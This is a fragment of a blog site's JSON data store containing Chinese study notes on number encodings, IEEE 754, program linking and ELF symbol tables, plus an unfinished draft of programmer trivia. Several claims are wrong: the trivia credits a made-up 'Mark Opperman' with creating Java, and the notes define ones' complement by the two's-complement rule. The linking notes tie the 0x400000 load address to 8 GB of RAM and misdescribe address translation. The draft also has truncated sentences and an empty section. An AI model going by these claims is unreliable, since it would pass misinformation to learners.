id=\"补码表示法\"><a href=\"#补码表示法\" class=\"headerlink\" title=\"补码表示法\"></a>补码表示法</h5><p>也称“２－补码”<br>规则：<br>１、当Xt 为正数时，　[Xt]补　= Xt = M+Xt(mod M);<br>２、当Xt 为负数时，　[Xt]补　= M - |Xt| = M+Xt(mod M);<br>即：[1101100]补　= 2^8 + 1101100 = 100000000 + 1101100(mod 2^8) = 01101100<br>[-1101100]补　= 2^8 - 1101100 = 100000000 - 1101100 = 10000000 + (1111111 - 1101100) + 1 = 10000000 + 0010011 + 1(mod 2^8) = 10010100<br>优点：１、减少了-0与+0的切换<br>2、占用少一个编码表示，补码比原码能多表示一个最小负数，可以用-2^(n-1)来表示最小负数。<br>3、两数的补码之和（差）=两数和（差）的补码。<br>运用：在计算机中，补码用来表示带符号正数。</p><h5 id=\"反码表示法\"><a href=\"#反码表示法\" class=\"headerlink\" title=\"反码表示法\"></a>反码表示法</h5><p>规则：<br>正数和原码相同，负数的补码采用“各位取反，末尾加1”<br>即： [01100]反 = [10100]反<br>缺点：1、0的表示不唯一。<br>2、表数范围比补码少一个最小负数。<br>3、运算时必须考虑循环进位。<br>运用：反码在计算机中很少被使用，有事做数码变换的中间表示形式（我们可以快速从反码知道原码和补码）。</p><h5 id=\"移码表示法\"><a href=\"#移码表示法\" class=\"headerlink\" title=\"移码表示法\"></a>移码表示法</h5><p>规则：<br>[E]移 = 偏置常数 + E （偏置常数通常取2^(n-1)或2^(n-1)-1）<br>运用：通常表示浮点数的阶（即指数）</p><h5 id=\"浮点数的表示-IEEE754浮点数\"><a href=\"#浮点数的表示-IEEE754浮点数\" class=\"headerlink\" title=\"浮点数的表示(IEEE754浮点数)\"></a>浮点数的表示(IEEE754浮点数)</h5><p>IEEE754浮点数的表示：<br><img src=\"/计算机系统基础/basic-computer-sience-chapter2/ieee754image.png\" alt=\"ieee754image\"><br><img src=\"/计算机系统基础/basic-computer-sience-chapter2/IEEE754_chart.jpg\" alt=\"chart_of_iee754\"><br>sign: 符号位，0表示正数1表示负数<br>exponent： 阶码，由偏置常数+偏移量组成<br>function： 位数</p><h5 id=\"为什么要有IEEE754标准？\"><a href=\"#为什么要有IEEE754标准？\" class=\"headerlink\" title=\"为什么要有IEEE754标准？\"></a>为什么要有IEEE754标准？</h5><p><strong>答：在此标准出来之前，不同电脑中的浮点数表示不唯一，一个程序由此电脑移到彼电脑可能需要重新编码。为了让程序员更加专心于程序的本身，而非多个不同电脑的差异做无用功，因此出现IEEE754标准</strong></p><h5 id=\"什么是IEEE754标准？\"><a href=\"#什么是IEEE754标准？\" class=\"headerlink\" title=\"什么是IEEE754标准？\"></a>什么是IEEE754标准？</h5><p><strong>以双精度为例，相比于传统浮点位，IEEE754标准使传统阶码标准之上，偏置常数从原来的10000000000(2^(n-1))变为00000000000(2^(n-1)-1),即隐藏移码，从原来的1024变成1023，这种做法有两个好处<br>1、尾数可表示的位数多一位，因而使得浮点数的精度更高。<br>2、阶码的可表示范围更大，因而使浮点数表示范围更大</strong></p><h5 id=\"IEEE754解释：\"><a href=\"#IEEE754解释：\" class=\"headerlink\" title=\"IEEE754解释：\"></a>IEEE754解释：</h5><h5 id=\"question\"><a href=\"#question\" class=\"headerlink\" title=\"question:\"></a>question:</h5><p>请判断下列关系表达式在32位机子上运行上是否永真，去除无穷大和NAN的任何值,i、f、d分别表示位,int,float,double<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、 i == (int)(float) i   //不相等，因为int为32位，float为23位精度</span><br><span class=\"line\">2、 f == (float)(int)f    //不相等，小数位精度缺失</span><br><span class=\"line\">3、 i == (int)(double)i   //相等</span><br><span class=\"line\">4、 f == (float)(double)i //相等</span><br></pre></td></tr></table></figure><p></p><h3 id=\"整数的加减\"><a href=\"#整数的加减\" class=\"headerlink\" title=\"整数的加减\"></a>整数的加减</h3><p><img src=\"/计算机系统基础/basic-computer-sience-chapter2/choiceTwoWay.jpg\" alt=\"choiceTwoWay\"><br>零标志位为zf，溢出标志位位of；<br>符号标志sf，进/借位标志cf<br>zf=1时，表示结果为0；<br>of=1时，表示带符号整数的加减法运算发生溢出；<br>cf=Sub异或C</p><h4 id=\"小结：\"><a href=\"#小结：\" class=\"headerlink\" title=\"小结：\"></a>小结：</h4><p>这章也为我解释了为什么int型到达一定的位数之后会由正数变成负数。溢出让我更清晰的明白了其中的原理。还有浮点数，让我明白了大数加1之后并没有什么变化的最基础原理。IEEE754标准也让我更加清晰了浮点数的存储方式，以及其工作原理。</p>"},{"title":"程序员的5个冷知识","_content":"### 八进制o 来源\n八进制otal来源自拉丁语otol，otol原本是\n以前就觉得表示八进制和十进制的oct和dec跟表示十月和十二月的October和December很像，今天在水木的joke版看到有人说古罗马历法里，October是八月，December是10月，顿时觉得恍然大悟啊。然后顺手wiki了一下，October来自拉丁语表示八的octo，而December来自拉丁语表示十的decem。\n### 为什么for循环定义为i，j，k\n上学的时候，我们设置未知的变量都是x,y,z，而在平时写for循环程式的时候却变成了i,j,k？似乎大多数人都没有考虑过这个问题，因为从教科书到网上的各路教程似乎默认成为我们程式的一员。刨根问底：我们几乎运用的大众编程语言都是基于英文之上的，而这里的i，在英文中代表的是**item**的意思。为了多变量的方便，就如同x，y，z一般，自然而然的就接上j,k了。\n### c语言为什么叫c语言？\nC语言的原型ALGOL 60语言。（也称为A语言）\n1963年，剑桥大学将ALGOL 60语言发展成为CPL(Combined Programming Language)语言。\n1967年，剑桥大学的Matin Richards 对CPL语言进行了简化，于是产生了BCPL语言。\n1970年，美国贝尔实验室的Ken Thompson将BCPL进行了修改，并为它起了一个有趣的名字“B语言”。意思是将CPL语言煮干，提炼出它的精华。并且他用B语言写了第一个UNIX操作系统。\n而在1973年，B语言也给人“煮”了一下，美国贝尔实验室的D.M.RITCHIE在B语言的基础上最终设计出了一种新的语言，他取了BCPL的第二个字母作为这种语言的名字，这就是C语言。\n为了使UNIX操作系统推广，1977年Dennis M.Ritchie 发表了不依赖于具体机器系统的C语言编译文本《可移植的C语言编译程序》。即是著名的ANSI C。\n1978年Brian W.Kernighian和Dennis M.Ritchie出版了名著《C语言程序》（The C Programming Language），从而使C语言成为当时世界上流行最广泛的高级程序设计语言。\n1988年，随着微型计算机的日益普及, C语言出现了许多版本。由于没有统一的标准,使得这些C语言之间出现了一些不一致的地方。为了改变这种情况,美国国家标准研究所(ANSI)为C语言制定了一套ANSI标准, 成为现行的C语言标准3.C语言的主要特点 。C语言发展迅速, 而且成为最受欢迎的语言之一, 主要因为它具有强大的功能。许多著名的系统软件, 如DBASE Ⅲ PLUS、DBASE Ⅳ 都是由C 语言编写的。用C语言加上一些汇编语言子程序, 就更能显示C语言的优势了,象PC- DOS 、WORDSTAR等就是用这种方法编写的。\n### java为什么是一杯咖啡\n这就要说到Java之父马克 奥颇门，他很爱在工作中喝咖啡，就像牛顿与苹果一样，他在与同事品尝咖啡时得到灵感创造了Java这门语言。当时有很多家叫做Java的咖啡店，Java是印度尼西亚爪哇岛的英文名称，因盛产咖啡而闻名。用Java来命名或宣传，彰显其咖啡的品质上佳。我们生活中也有许多楼盘以香榭丽舍,巴黎等命名显得自己与国际接轨，高端洋气。\n马克 奥颇门是个很有趣的人，不仅将创造的语言命名为Java，图标也是一杯热的冒气的咖啡，而且在Java语言中，许多库的名字都与咖啡有关如JavaBeans（咖啡豆）、NetBeans（网络豆）以及ObjectBeans （对象豆）。\n### Java和JavaScript有那些瓜葛\n\n### MySql ,mariadb,maxdb\nMonty  My是他的大女儿的名字，Max是他儿子的名字，Maria是他小女儿的名字，以及MySQL的正确发音，Monty给出了标准答案/maɪ es kjuː ɛl/，或者是/mjuː es kjuː ɛl /，因为My是一个芬兰语名字，所以也可以用后者芬兰语发音。\n","source":"_drafts/magic-coding.md","raw":"---\ntitle: 程序员的5个冷知识\ntags: code\n---\n### 八进制o 来源\n八进制otal来源自拉丁语otol，otol原本是\n以前就觉得表示八进制和十进制的oct和dec跟表示十月和十二月的October和December很像，今天在水木的joke版看到有人说古罗马历法里，October是八月，December是10月，顿时觉得恍然大悟啊。然后顺手wiki了一下，October来自拉丁语表示八的octo，而December来自拉丁语表示十的decem。\n### 为什么for循环定义为i，j，k\n上学的时候，我们设置未知的变量都是x,y,z，而在平时写for循环程式的时候却变成了i,j,k？似乎大多数人都没有考虑过这个问题，因为从教科书到网上的各路教程似乎默认成为我们程式的一员。刨根问底：我们几乎运用的大众编程语言都是基于英文之上的，而这里的i，在英文中代表的是**item**的意思。为了多变量的方便，就如同x，y，z一般，自然而然的就接上j,k了。\n### c语言为什么叫c语言？\nC语言的原型ALGOL 60语言。（也称为A语言）\n1963年，剑桥大学将ALGOL 60语言发展成为CPL(Combined Programming Language)语言。\n1967年，剑桥大学的Matin Richards 对CPL语言进行了简化，于是产生了BCPL语言。\n1970年，美国贝尔实验室的Ken Thompson将BCPL进行了修改，并为它起了一个有趣的名字“B语言”。意思是将CPL语言煮干，提炼出它的精华。并且他用B语言写了第一个UNIX操作系统。\n而在1973年，B语言也给人“煮”了一下，美国贝尔实验室的D.M.RITCHIE在B语言的基础上最终设计出了一种新的语言，他取了BCPL的第二个字母作为这种语言的名字，这就是C语言。\n为了使UNIX操作系统推广，1977年Dennis M.Ritchie 发表了不依赖于具体机器系统的C语言编译文本《可移植的C语言编译程序》。即是著名的ANSI C。\n1978年Brian W.Kernighian和Dennis M.Ritchie出版了名著《C语言程序》（The C Programming Language），从而使C语言成为当时世界上流行最广泛的高级程序设计语言。\n1988年，随着微型计算机的日益普及, C语言出现了许多版本。由于没有统一的标准,使得这些C语言之间出现了一些不一致的地方。为了改变这种情况,美国国家标准研究所(ANSI)为C语言制定了一套ANSI标准, 成为现行的C语言标准3.C语言的主要特点 。C语言发展迅速, 而且成为最受欢迎的语言之一, 主要因为它具有强大的功能。许多著名的系统软件, 如DBASE Ⅲ PLUS、DBASE Ⅳ 都是由C 语言编写的。用C语言加上一些汇编语言子程序, 就更能显示C语言的优势了,象PC- DOS 、WORDSTAR等就是用这种方法编写的。\n### java为什么是一杯咖啡\n这就要说到Java之父马克 奥颇门，他很爱在工作中喝咖啡，就像牛顿与苹果一样，他在与同事品尝咖啡时得到灵感创造了Java这门语言。当时有很多家叫做Java的咖啡店，Java是印度尼西亚爪哇岛的英文名称，因盛产咖啡而闻名。用Java来命名或宣传，彰显其咖啡的品质上佳。我们生活中也有许多楼盘以香榭丽舍,巴黎等命名显得自己与国际接轨，高端洋气。\n马克 奥颇门是个很有趣的人，不仅将创造的语言命名为Java，图标也是一杯热的冒气的咖啡，而且在Java语言中，许多库的名字都与咖啡有关如JavaBeans（咖啡豆）、NetBeans（网络豆）以及ObjectBeans （对象豆）。\n### Java和JavaScript有那些瓜葛\n\n### MySql ,mariadb,maxdb\nMonty  My是他的大女儿的名字，Max是他儿子的名字，Maria是他小女儿的名字，以及MySQL的正确发音，Monty给出了标准答案/maɪ es kjuː ɛl/，或者是/mjuː es kjuː ɛl /，因为My是一个芬兰语名字，所以也可以用后者芬兰语发音。\n","slug":"magic-coding","published":0,"date":"2021-08-24T01:49:51.284Z","updated":"2021-08-24T01:49:51.284Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nyzz000b4jzx5n2ekzma","content":"<h3 id=\"八进制o-来源\"><a href=\"#八进制o-来源\" class=\"headerlink\" title=\"八进制o 来源\"></a>八进制o 来源</h3><p>八进制otal来源自拉丁语otol，otol原本是<br>以前就觉得表示八进制和十进制的oct和dec跟表示十月和十二月的October和December很像，今天在水木的joke版看到有人说古罗马历法里，October是八月，December是10月，顿时觉得恍然大悟啊。然后顺手wiki了一下，October来自拉丁语表示八的octo，而December来自拉丁语表示十的decem。</p><h3 id=\"为什么for循环定义为i，j，k\"><a href=\"#为什么for循环定义为i，j，k\" class=\"headerlink\" title=\"为什么for循环定义为i，j，k\"></a>为什么for循环定义为i，j，k</h3><p>上学的时候，我们设置未知的变量都是x,y,z，而在平时写for循环程式的时候却变成了i,j,k？似乎大多数人都没有考虑过这个问题，因为从教科书到网上的各路教程似乎默认成为我们程式的一员。刨根问底：我们几乎运用的大众编程语言都是基于英文之上的，而这里的i，在英文中代表的是<strong>item</strong>的意思。为了多变量的方便，就如同x，y，z一般，自然而然的就接上j,k了。</p><h3 id=\"c语言为什么叫c语言？\"><a href=\"#c语言为什么叫c语言？\" class=\"headerlink\" title=\"c语言为什么叫c语言？\"></a>c语言为什么叫c语言？</h3><p>C语言的原型ALGOL 60语言。（也称为A语言）<br>1963年，剑桥大学将ALGOL 60语言发展成为CPL(Combined Programming Language)语言。<br>1967年，剑桥大学的Matin Richards 对CPL语言进行了简化，于是产生了BCPL语言。<br>1970年，美国贝尔实验室的Ken Thompson将BCPL进行了修改，并为它起了一个有趣的名字“B语言”。意思是将CPL语言煮干，提炼出它的精华。并且他用B语言写了第一个UNIX操作系统。<br>而在1973年，B语言也给人“煮”了一下，美国贝尔实验室的D.M.RITCHIE在B语言的基础上最终设计出了一种新的语言，他取了BCPL的第二个字母作为这种语言的名字，这就是C语言。<br>为了使UNIX操作系统推广，1977年Dennis M.Ritchie 发表了不依赖于具体机器系统的C语言编译文本《可移植的C语言编译程序》。即是著名的ANSI C。<br>1978年Brian W.Kernighian和Dennis M.Ritchie出版了名著《C语言程序》（The C Programming Language），从而使C语言成为当时世界上流行最广泛的高级程序设计语言。<br>1988年，随着微型计算机的日益普及, C语言出现了许多版本。由于没有统一的标准,使得这些C语言之间出现了一些不一致的地方。为了改变这种情况,美国国家标准研究所(ANSI)为C语言制定了一套ANSI标准, 成为现行的C语言标准3.C语言的主要特点 。C语言发展迅速, 而且成为最受欢迎的语言之一, 主要因为它具有强大的功能。许多著名的系统软件, 如DBASE Ⅲ PLUS、DBASE Ⅳ 都是由C 语言编写的。用C语言加上一些汇编语言子程序, 就更能显示C语言的优势了,象PC- DOS 、WORDSTAR等就是用这种方法编写的。</p><h3 id=\"java为什么是一杯咖啡\"><a href=\"#java为什么是一杯咖啡\" class=\"headerlink\" title=\"java为什么是一杯咖啡\"></a>java为什么是一杯咖啡</h3><p>这就要说到Java之父马克 奥颇门，他很爱在工作中喝咖啡，就像牛顿与苹果一样，他在与同事品尝咖啡时得到灵感创造了Java这门语言。当时有很多家叫做Java的咖啡店，Java是印度尼西亚爪哇岛的英文名称，因盛产咖啡而闻名。用Java来命名或宣传，彰显其咖啡的品质上佳。我们生活中也有许多楼盘以香榭丽舍,巴黎等命名显得自己与国际接轨，高端洋气。<br>马克 奥颇门是个很有趣的人，不仅将创造的语言命名为Java，图标也是一杯热的冒气的咖啡，而且在Java语言中，许多库的名字都与咖啡有关如JavaBeans（咖啡豆）、NetBeans（网络豆）以及ObjectBeans （对象豆）。</p><h3 id=\"Java和JavaScript有那些瓜葛\"><a href=\"#Java和JavaScript有那些瓜葛\" class=\"headerlink\" title=\"Java和JavaScript有那些瓜葛\"></a>Java和JavaScript有那些瓜葛</h3><h3 id=\"MySql-mariadb-maxdb\"><a href=\"#MySql-mariadb-maxdb\" class=\"headerlink\" title=\"MySql ,mariadb,maxdb\"></a>MySql ,mariadb,maxdb</h3><p>Monty My是他的大女儿的名字，Max是他儿子的名字，Maria是他小女儿的名字，以及MySQL的正确发音，Monty给出了标准答案/maɪ es kjuː ɛl/，或者是/mjuː es kjuː ɛl /，因为My是一个芬兰语名字，所以也可以用后者芬兰语发音。</p>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"八进制o-来源\"><a href=\"#八进制o-来源\" class=\"headerlink\" title=\"八进制o 来源\"></a>八进制o 来源</h3><p>八进制otal来源自拉丁语otol，otol原本是<br>以前就觉得表示八进制和十进制的oct和dec跟表示十月和十二月的October和December很像，今天在水木的joke版看到有人说古罗马历法里，October是八月，December是10月，顿时觉得恍然大悟啊。然后顺手wiki了一下，October来自拉丁语表示八的octo，而December来自拉丁语表示十的decem。</p><h3 id=\"为什么for循环定义为i，j，k\"><a href=\"#为什么for循环定义为i，j，k\" class=\"headerlink\" title=\"为什么for循环定义为i，j，k\"></a>为什么for循环定义为i，j，k</h3><p>上学的时候，我们设置未知的变量都是x,y,z，而在平时写for循环程式的时候却变成了i,j,k？似乎大多数人都没有考虑过这个问题，因为从教科书到网上的各路教程似乎默认成为我们程式的一员。刨根问底：我们几乎运用的大众编程语言都是基于英文之上的，而这里的i，在英文中代表的是<strong>item</strong>的意思。为了多变量的方便，就如同x，y，z一般，自然而然的就接上j,k了。</p><h3 id=\"c语言为什么叫c语言？\"><a href=\"#c语言为什么叫c语言？\" class=\"headerlink\" title=\"c语言为什么叫c语言？\"></a>c语言为什么叫c语言？</h3><p>C语言的原型ALGOL 60语言。（也称为A语言）<br>1963年，剑桥大学将ALGOL 60语言发展成为CPL(Combined Programming Language)语言。<br>1967年，剑桥大学的Matin Richards 对CPL语言进行了简化，于是产生了BCPL语言。<br>1970年，美国贝尔实验室的Ken Thompson将BCPL进行了修改，并为它起了一个有趣的名字“B语言”。意思是将CPL语言煮干，提炼出它的精华。并且他用B语言写了第一个UNIX操作系统。<br>而在1973年，B语言也给人“煮”了一下，美国贝尔实验室的D.M.RITCHIE在B语言的基础上最终设计出了一种新的语言，他取了BCPL的第二个字母作为这种语言的名字，这就是C语言。<br>为了使UNIX操作系统推广，1977年Dennis M.Ritchie 发表了不依赖于具体机器系统的C语言编译文本《可移植的C语言编译程序》。即是著名的ANSI C。<br>1978年Brian W.Kernighian和Dennis M.Ritchie出版了名著《C语言程序》（The C Programming Language），从而使C语言成为当时世界上流行最广泛的高级程序设计语言。<br>1988年，随着微型计算机的日益普及, C语言出现了许多版本。由于没有统一的标准,使得这些C语言之间出现了一些不一致的地方。为了改变这种情况,美国国家标准研究所(ANSI)为C语言制定了一套ANSI标准, 成为现行的C语言标准3.C语言的主要特点 。C语言发展迅速, 而且成为最受欢迎的语言之一, 主要因为它具有强大的功能。许多著名的系统软件, 如DBASE Ⅲ PLUS、DBASE Ⅳ 都是由C 语言编写的。用C语言加上一些汇编语言子程序, 就更能显示C语言的优势了,象PC- DOS 、WORDSTAR等就是用这种方法编写的。</p><h3 id=\"java为什么是一杯咖啡\"><a href=\"#java为什么是一杯咖啡\" class=\"headerlink\" title=\"java为什么是一杯咖啡\"></a>java为什么是一杯咖啡</h3><p>这就要说到Java之父马克 奥颇门，他很爱在工作中喝咖啡，就像牛顿与苹果一样，他在与同事品尝咖啡时得到灵感创造了Java这门语言。当时有很多家叫做Java的咖啡店，Java是印度尼西亚爪哇岛的英文名称，因盛产咖啡而闻名。用Java来命名或宣传，彰显其咖啡的品质上佳。我们生活中也有许多楼盘以香榭丽舍,巴黎等命名显得自己与国际接轨，高端洋气。<br>马克 奥颇门是个很有趣的人，不仅将创造的语言命名为Java，图标也是一杯热的冒气的咖啡，而且在Java语言中，许多库的名字都与咖啡有关如JavaBeans（咖啡豆）、NetBeans（网络豆）以及ObjectBeans （对象豆）。</p><h3 id=\"Java和JavaScript有那些瓜葛\"><a href=\"#Java和JavaScript有那些瓜葛\" class=\"headerlink\" title=\"Java和JavaScript有那些瓜葛\"></a>Java和JavaScript有那些瓜葛</h3><h3 id=\"MySql-mariadb-maxdb\"><a href=\"#MySql-mariadb-maxdb\" class=\"headerlink\" title=\"MySql ,mariadb,maxdb\"></a>MySql ,mariadb,maxdb</h3><p>Monty My是他的大女儿的名字，Max是他儿子的名字，Maria是他小女儿的名字，以及MySQL的正确发音，Monty给出了标准答案/maɪ es kjuː ɛl/，或者是/mjuː es kjuː ɛl /，因为My是一个芬兰语名字，所以也可以用后者芬兰语发音。</p>"},{"title":"计算机系统基础－－第四章(程序的链接)","date":"2017-05-24T00:26:05.000Z","dir":"计算机系统基础","keywords":"计算机系统基础－－第四章(程序的链接)","_content":"#### 什么是程序的链接？\n_将gcc生成的若干个.0文件为后缀的，vc输出为.obj为后缀的可重定位目标文件组合起来，生成一个可执行目标文件_\n#### 程序链接的好处：\n1、模块化(可分成不同模块全部编译成.o文件后链接即可运行。而不仅仅是只有一个.c文件，对于大工程来说清晰划分)\n2、效率高(由于可以使多个文件同时编写，多个模块同时修改，因此这样提升了效率)\n##### 在链接先进行编译和汇编，在第三章聊过\n\n#### 可执行文件与.o文件的汇编差别在哪？\n由于可执行文件是将可重定位二进制文件重新组合，因此其自身的虚拟地址转化为了逻辑地址,如下\n```\n// test.c\nint main(int i,int j){\n\tint x = i+j;\n\treturn x;\n}\n//使用objdump -d test.o反汇编出来的.o文件\n// test.o\nDisassembly of section .text:\n0000000000000000 <main>:\n   0:\t55                   \tpush   %rbp       \n   1:\t48 89 e5             \tmov    %rsp,%rbp\n   4:\t89 7d ec             \tmov    %edi,-0x14(%rbp)\n   7:\t89 75 e8             \tmov    %esi,-0x18(%rbp)\n   a:\t8b 55 ec             \tmov    -0x14(%rbp),%edx\n   d:\t8b 45 e8             \tmov    -0x18(%rbp),%eax\n  10:\t01 d0                \tadd    %edx,%eax\n  12:\t89 45 fc             \tmov    %eax,-0x4(%rbp)\n  15:\t8b 45 fc             \tmov    -0x4(%rbp),%eax\n  18:\t5d                   \tpop    %rbp\n  19:\tc3                   \tretq   \n//每个.o文件开头都是以0开始，还没有被链接成位可执行文件，在其内部为虚拟地址\n//使用objdump -d test反汇编出来的可执行文件\n//test\n00000000004004d6 <main>:\n  4004d6:\t55                   \tpush   %rbp\n  4004d7:\t48 89 e5             \tmov    %rsp,%rbp\n  4004da:\t89 7d ec             \tmov    %edi,-0x14(%rbp)\n  4004dd:\t89 75 e8             \tmov    %esi,-0x18(%rbp)\n  4004e0:\t8b 55 ec             \tmov    -0x14(%rbp),%edx\n  4004e3:\t8b 45 e8             \tmov    -0x18(%rbp),%eax\n  4004e6:\t01 d0                \tadd    %edx,%eax\n  4004e8:\t89 45 fc             \tmov    %eax,-0x4(%rbp)\n  4004eb:\t8b 45 fc             \tmov    -0x4(%rbp),%eax\n  4004ee:\t5d                   \tpop    %rbp\n  4004ef:\tc3                   \tretq   \n// 由于我的机子是8g内存，因此开头以400...开头\n// test.o与test相比，test经过链接后，将虚拟地址转化成为逻辑地址\n```\n#### 目标文件格式\nELF格式\n每个可执行文件都有一个ELF头，里面包括着可执行文件的信息。\n#### ELF头\n![elfImage](elfImage.jpg)\n夹在ELF头和节头部表之间的都是节。一个典型的ELF可重定位目标文件包含下面几个节：\n.text：已编译程序的机器代码。\n.rodata：只读数据，比如printf语句中的格式串和开关（switch）语句的跳转表。\n.data：已初始化的全局C变量。局部C变量在运行时被保存在栈中，既不出现在.data中，也不出现在.bss节中。\n.bss：未初始化的全局C变量。在目标文件中这个节不占据实际的空间，它仅仅是一个占位符。目标文件格式区分初始化和未初始化变量是为了空间效率在：在目标文件中，未初始化变量不需要占据任何实际的磁盘空间。\n.symtab：一个符号表（symbol table），它存放在程序中被定义和引用的函数和全局变量的信息。一些程序员错误地认为必须通过-g选项来编译一个程序，得到符号表信息。实际上，每个可重定位目标文件在.symtab中都有一张符号表。然而，和编译器中的符号表不同，.symtab符号表不包含局部变量的表目。\n.rel.text：当链接噐把这个目标文件和其他文件结合时，.text节中的许多位置都需要修改。一般而言，任何调用外部函数或者引用全局变量的指令都需要修改。另一方面调用本地函数的指令则不需要修改。注意，可执行目标文件中并不需要重定位信息，因此通常省略，除非使用者显式地指示链接器包含这些信息。\n.rel.data：被模块定义或引用的任何全局变量的信息。一般而言，任何已初始化全局变量的初始值是全局变量或者外部定义函数的地址都需要被修改。\n.debug：一个调试符号表，其有些表目是程序中定义的局部变量和类型定义，有些表目是程序中定义和引用的全局变量，有些是原始的C源文件。只有以-g选项调用编译驱动程序时，才会得到这张表。\n.line：原始C源程序中的行号和.text节中机器指令之间的映射。只有以-g选项调用编译驱动程序时，才会得到这张表。\n.strtab：一个字符串表，其内容包括.symtab和.debug节中的符号表，以及节头部中的节名字。字符串表就是以null结尾的字符串序列。\n旁注：为什么未初始化的数据称为.bss?\n用术语.bss来表示未初始化的数据是很普遍的。它起始于IBM 704汇编语言（大约在1957年）中”块存储开始（Block Storage Start）“指令的首字母缩写，并沿用至今。一个记住区分.data和.bss节的简单方法是把“bss”看成是“更好地节省空间（Better Save Space）！“的缩写。\n#### 符号表和符号解析\n##### 符号表的类型\n1、在模块m中定义冰杯其他模块引用的全局符号\n2、在其他模块定义并且被m引用的外部符号\n3、在模块m中定义并在m中引用的本地符号\n##### 使用readelf -s prog.o查看符号表\n```\nreadelf -s main.o\nSymbol table '.symtab' contains 11 entries:\n   Num:    Value          Size Type    Bind   Vis      Ndx Name\n     8: 0000000000000000     8 OBJECT  GLOBAL DEFAULT    3 buf\n     9: 0000000000000000    16 FUNC    GLOBAL DEFAULT    1 main\n    10: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND swap\nreadelf -s swap.o\nSymbol table '.symtab' contains 12 entries:\n   Num:    Value          Size Type    Bind   Vis      Ndx Name\n     5: 0000000000000000     8 OBJECT  LOCAL  DEFAULT    5 bufp1\n     9: 0000000000000000     8 OBJECT  GLOBAL DEFAULT    3 bufp0\n    10: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND buf\n    11: 0000000000000000    60 FUNC    GLOBAL DEFAULT    1 swap\n```\n_GLOBAL位全局变量，LOCAL为局部变量，swap为函数，Ndx位本地变量，UND为undefined_\n##### 符号解析\n##### 全局符号的强弱特性\n定义：函数名和已初始化的全局变量是强符号，未初始化的全局变量是弱符号。\n例如上面的，main,buf,swap,bufp0是 强符号,bufp1位本地符号，本地符号无强弱之分。\n\n多重定义符号处理：\n**规则1：强符号不能多次定义，也即强符号只能被定义一次，否则链接错误\n规则2：若一个符号被说明为一次强符号定义和多个弱符号定义，则按强符号为准\n规则3：若有多个弱符号定义，则任选其中一个**\n##### 强弱符号链接错误解决方案：\n1、尽量避免使用全局符号\n2、把全局符号定义位static，这样就没有强弱之分\n3、尽量要给全局变量赋初值使其变成强符号\n4、外部全局变量尽量使用extern\n#### 重定位\n规则：\n函数调用采用相对重定位\n即使用R_386_PC32:ADDR(r_sym)-((ADDR(.text)+ r_offset) - init)\n全局变量采用绝对重定位\n即使用R_386_32把32位的地址值直接代替\n###### 重定位的工作\n1、节和定义符号的重定位\n2、引用符号的重定位\n#### 链接\n1、静态链接：将用户程序中使用的库文件完整拷贝形成一个完整的可执行文件\n优点：可随时执行文件，可执行文件不会因为库文件丢失而无法执行\n缺点：导致相同库文件多个备份\n2、动态链接：根据代码、数据、重定位和符号表信息，能在执行目标文件是装入或运行被动态的装入内存并自动链接\n优点：减少库文件的多个备份\n缺点：缺少库文件无法运行\n\n\n#### 小结：\n至此，第四章也完成了。这一章主要讲的是生成可执行文件的过程，由最初始的编辑代码，然后将其预编译，编译，汇编，链接，生成可执行文件。这个过程是不仅由我们看到的小黑框那么简单，这段时间还经历着将代码转成汇编，将所定义的全局变量以及函数名称建表，把各个符号通过重定位形成一个最终没有缺失的可执行文件。第四章让我很清晰的清楚可执行文件的生成，也把当初的黑匣子打开，让我更深刻的理解其工作原理。","source":"_posts/basic-computer-sience-chapter4.md","raw":"---\ntitle: 计算机系统基础－－第四章(程序的链接)\ndate: 2017-05-24 08:26:05\ntags: 计算机系统基础\ndir: 计算机系统基础\nkeywords: 计算机系统基础－－第四章(程序的链接)\n---\n#### 什么是程序的链接？\n_将gcc生成的若干个.0文件为后缀的，vc输出为.obj为后缀的可重定位目标文件组合起来，生成一个可执行目标文件_\n#### 程序链接的好处：\n1、模块化(可分成不同模块全部编译成.o文件后链接即可运行。而不仅仅是只有一个.c文件，对于大工程来说清晰划分)\n2、效率高(由于可以使多个文件同时编写，多个模块同时修改，因此这样提升了效率)\n##### 在链接先进行编译和汇编，在第三章聊过\n\n#### 可执行文件与.o文件的汇编差别在哪？\n由于可执行文件是将可重定位二进制文件重新组合，因此其自身的虚拟地址转化为了逻辑地址,如下\n```\n// test.c\nint main(int i,int j){\n\tint x = i+j;\n\treturn x;\n}\n//使用objdump -d test.o反汇编出来的.o文件\n// test.o\nDisassembly of section .text:\n0000000000000000 <main>:\n   0:\t55                   \tpush   %rbp       \n   1:\t48 89 e5             \tmov    %rsp,%rbp\n   4:\t89 7d ec             \tmov    %edi,-0x14(%rbp)\n   7:\t89 75 e8             \tmov    %esi,-0x18(%rbp)\n   a:\t8b 55 ec             \tmov    -0x14(%rbp),%edx\n   d:\t8b 45 e8             \tmov    -0x18(%rbp),%eax\n  10:\t01 d0                \tadd    %edx,%eax\n  12:\t89 45 fc             \tmov    %eax,-0x4(%rbp)\n  15:\t8b 45 fc             \tmov    -0x4(%rbp),%eax\n  18:\t5d                   \tpop    %rbp\n  19:\tc3                   \tretq   \n//每个.o文件开头都是以0开始，还没有被链接成位可执行文件，在其内部为虚拟地址\n//使用objdump -d test反汇编出来的可执行文件\n//test\n00000000004004d6 <main>:\n  4004d6:\t55                   \tpush   %rbp\n  4004d7:\t48 89 e5             \tmov    %rsp,%rbp\n  4004da:\t89 7d ec             \tmov    %edi,-0x14(%rbp)\n  4004dd:\t89 75 e8             \tmov    %esi,-0x18(%rbp)\n  4004e0:\t8b 55 ec             \tmov    -0x14(%rbp),%edx\n  4004e3:\t8b 45 e8             \tmov    -0x18(%rbp),%eax\n  4004e6:\t01 d0                \tadd    %edx,%eax\n  4004e8:\t89 45 fc             \tmov    %eax,-0x4(%rbp)\n  4004eb:\t8b 45 fc             \tmov    -0x4(%rbp),%eax\n  4004ee:\t5d                   \tpop    %rbp\n  4004ef:\tc3                   \tretq   \n// 由于我的机子是8g内存，因此开头以400...开头\n// test.o与test相比，test经过链接后，将虚拟地址转化成为逻辑地址\n```\n#### 